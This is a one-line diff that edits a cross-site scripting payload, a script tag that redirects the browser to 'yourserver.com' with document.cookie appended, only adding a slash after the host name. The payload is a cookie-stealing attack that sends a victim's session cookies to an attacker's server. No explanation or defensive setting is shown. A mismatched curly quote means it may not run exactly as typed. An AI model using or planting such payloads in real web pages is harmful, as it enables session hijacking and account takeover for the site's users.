@@ -1,1 +1,1 @@
-<script>document.location=“http://yourserver.com?c="+document.cookie;</script>
+<script>document.location=“http://yourserver.com/?c="+document.cookie;</script>
